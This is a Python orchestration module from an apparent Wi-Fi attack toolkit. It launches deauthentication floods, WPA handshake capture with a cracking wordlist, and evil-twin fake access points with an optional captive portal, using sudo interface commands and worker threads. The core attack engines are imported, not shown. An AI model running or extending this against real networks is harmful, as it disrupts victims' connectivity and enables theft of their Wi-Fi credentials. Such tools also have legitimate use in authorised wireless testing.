"""Attack orchestration: interface setup, thread lifecycle, engine dispatch, progress/log
events (was web/attacks/helpers.py).

The engine workers are framework-agnostic now, so this layer injects the state-aware log
sink (``app.state.log_message`` — append + logger, no socket emit) into the workers that
took the old ``add_log_message_shared``, preserving the original two log paths exactly:
worker/thread logs go to the polled attack log only, while orchestration logs (this
module's ``add_log_message``) additionally emit the ``attack_log`` socket event.
"""

import os
import time
import threading
import subprocess

from app.config import config
from app.core.logging import logger  # noqa: F401 (kept for parity / future use)
from app.core.network_utils import set_monitor_mode, set_managed_mode
from app.core.validation import (
    validate_bssid,
    validate_channel,
    validate_essid,
    validate_interface,
)
from app.engine.deauth_attack import deauth_worker, deauth_worker_for_handshake
from app.engine.capture_attack import capture_worker
from app.engine.evil_twin import (
    create_hostapd_config,
    create_dnsmasq_config,
    setup_fake_ap_network,
)
from app.extensions import socketio
from app.state import attack_state, stats, log_message


def update_attack_progress(progress):
    """Update the attack progress and emit a WebSocket event."""
    attack_state["progress"] = progress
    socketio.emit("attack_progress", {"progress": progress})


def add_log_message(message):
    """Add a log message (append + logger) AND emit the attack_log WebSocket event."""
    log_message(message)
    socketio.emit("attack_log", {"message": message})


def launch_deauth_attack(network, attack_config):
    """Launch a deauthentication attack against the specified network."""
    # Validate/whitelist every externally supplied value before it reaches a subprocess.
    bssid = validate_bssid(network["bssid"])
    channel = validate_channel(network["channel"])
    client = validate_bssid(attack_config.get("client", "FF:FF:FF:FF:FF:FF"))
    interface = validate_interface(config["interface"])
    count = attack_config.get("count", 10)
    interval = attack_config.get("interval", 0.1)

    # Check root privileges
    if not os.geteuid() == 0:
        add_log_message(
            "Warning: Not running as root. Deauthentication attacks require root privileges."
        )

    # Set monitor mode using subprocess and sudo
    try:
        add_log_message(f"Setting {interface} to monitor mode...")
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        subprocess.run(
            ["sudo", "iw", "dev", interface, "set", "type", "monitor"], check=True
        )
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        add_log_message(f"Interface {interface} set to monitor mode")
    except subprocess.CalledProcessError as e:
        add_log_message(f"Error setting monitor mode: {e}")
        raise

    # Set channel using subprocess
    try:
        add_log_message(f"Setting channel to {channel}...")
        subprocess.run(
            ["sudo", "iw", "dev", interface, "set", "channel", str(channel)], check=True
        )
        add_log_message(f"Channel set to {channel}")
    except subprocess.CalledProcessError as e:
        add_log_message(f"Error setting channel: {e}")
        # Try with iwconfig as fallback
        try:
            subprocess.run(
                ["sudo", "iwconfig", interface, "channel", str(channel)], check=True
            )
            add_log_message(f"Channel set to {channel} (using iwconfig)")
        except subprocess.CalledProcessError as e2:
            add_log_message(f"Error setting channel with iwconfig: {e2}")
            set_managed_mode(interface)
            raise

    # Start deauth thread
    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, client, interface, count, interval, attack_state["stop_event"]),
        daemon=True,
    )

    attack_state["threads"].append(deauth_thread)
    deauth_thread.start()
    add_log_message(f"Deauthentication attack started against {bssid}")
    update_attack_progress(10)  # Initial progress


def launch_handshake_attack(network, attack_config):
    """Launch a handshake capture attack against the specified network."""
    # Validate/whitelist every externally supplied value before it reaches a subprocess.
    bssid = validate_bssid(network["bssid"])
    channel = validate_channel(network["channel"])
    interface = validate_interface(config["interface"])
    duration = attack_config.get("duration", 5)
    wordlist = attack_config.get("wordlist", config["wordlist"])

    # Create output directory
    safe_bssid = bssid.replace(":", "-")
    output_dir = os.path.join(config["output_dir"], safe_bssid)
    os.makedirs(output_dir, exist_ok=True)
    cap_file = os.path.join(output_dir, "capture-01.cap")

    # Set monitor mode
    set_monitor_mode(interface)
    add_log_message(f"Interface {interface} set to monitor mode")
    update_attack_progress(10)

    # Start capture thread (inject the state-aware log sink -> no socket emit, as before)
    capture_thread = threading.Thread(
        target=capture_worker,
        args=(
            bssid,
            channel,
            interface,
            duration,
            os.path.join(output_dir, "capture"),
            cap_file,
            wordlist,
            attack_state["stop_event"],
            log_message,
        ),
        daemon=True,
    )

    # Start deauth thread (inject the state-aware log sink -> no socket emit, as before)
    deauth_thread = threading.Thread(
        target=deauth_worker_for_handshake,
        args=(
            bssid,
            "FF:FF:FF:FF:FF:FF",
            interface,
            10,
            0.1,
            attack_state["stop_event"],
            log_message,
        ),
        daemon=True,
    )

    attack_state["threads"].extend([capture_thread, deauth_thread])
    capture_thread.start()
    add_log_message("Handshake capture started")
    update_attack_progress(20)

    # Wait a bit before starting deauth
    time.sleep(2)
    deauth_thread.start()
    add_log_message("Deauthentication flood started")
    update_attack_progress(30)

    # Update stats when a handshake is captured
    stats["captures_count"] += 1


def launch_evil_twin_attack(network, attack_config):
    """Launch an evil twin attack against the specified network."""
    # Validate/whitelist every externally supplied value before it reaches a subprocess or
    # is written into a generated hostapd/dnsmasq config file.
    bssid = validate_bssid(network["bssid"])  # noqa: F841 (kept for parity with original)
    ssid = validate_essid(network["essid"])
    channel = validate_channel(attack_config.get("channel", network["channel"]))
    interface = validate_interface(config["interface"])
    captive_portal = attack_config.get("captive_portal", False)

    # Create output directory
    safe_ssid = "".join(c if c.isalnum() else "_" for c in ssid)
    output_dir = os.path.join(config["output_dir"], "evil_twin", safe_ssid)
    os.makedirs(output_dir, exist_ok=True)

    # Set managed mode
    set_managed_mode(interface)
    add_log_message(f"Interface {interface} set to managed mode")
    update_attack_progress(10)

    # Create config files
    hostapd_conf = create_hostapd_config(interface, ssid, channel, output_dir)
    dnsmasq_conf = create_dnsmasq_config(interface, output_dir)

    if hostapd_conf and dnsmasq_conf:
        # Setup network
        setup_fake_ap_network(interface)
        add_log_message("Fake AP network setup complete")
        update_attack_progress(30)

        # Start hostapd
        hostapd_thread = threading.Thread(
            target=run_hostapd,
            args=(hostapd_conf, attack_state["stop_event"]),
            daemon=True,
        )

        # Start dnsmasq
        dnsmasq_thread = threading.Thread(
            target=run_dnsmasq,
            args=(dnsmasq_conf, attack_state["stop_event"]),
            daemon=True,
        )

        attack_state["threads"].extend([hostapd_thread, dnsmasq_thread])
        hostapd_thread.start()
        dnsmasq_thread.start()
        add_log_message("Evil Twin attack started")
        update_attack_progress(50)

        # Start captive portal if enabled
        if captive_portal:
            add_log_message("Starting captive portal")
            update_attack_progress(70)
        else:
            add_log_message("Captive portal disabled")
    else:
        add_log_message("Failed to create required configuration files")
        raise Exception("Failed to create required configuration files")


def _terminate(process):
    """Stop a child process cleanly, escalating to kill if it ignores SIGTERM."""
    if process.poll() is not None:
        return
    process.terminate()
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()


def run_hostapd(config_file, stop_event):
    """Run hostapd with the specified configuration file (argv exec, no shell)."""
    try:
        add_log_message(f"Starting hostapd with config: {config_file}")
        process = subprocess.Popen(
            ["hostapd", config_file],
            stdout=subprocess.PIPE,
            text=True,
        )

        while not stop_event.is_set():
            line = process.stdout.readline()
            if line:
                add_log_message(f"[hostapd] {line.strip()}")
            time.sleep(0.1)

        _terminate(process)
    except Exception as e:
        add_log_message(f"Error in hostapd: {e}")


def run_dnsmasq(config_file, stop_event):
    """Run dnsmasq with the specified configuration file (argv exec, no shell)."""
    try:
        add_log_message(f"Starting dnsmasq with config: {config_file}")
        process = subprocess.Popen(
            ["dnsmasq", "-C", config_file, "-d"],
            stdout=subprocess.PIPE,
            text=True,
        )

        while not stop_event.is_set():
            line = process.stdout.readline()
            if line:
                add_log_message(f"[dnsmasq] {line.strip()}")
            time.sleep(0.1)

        _terminate(process)
    except Exception as e:
        add_log_message(f"Error in dnsmasq: {e}")
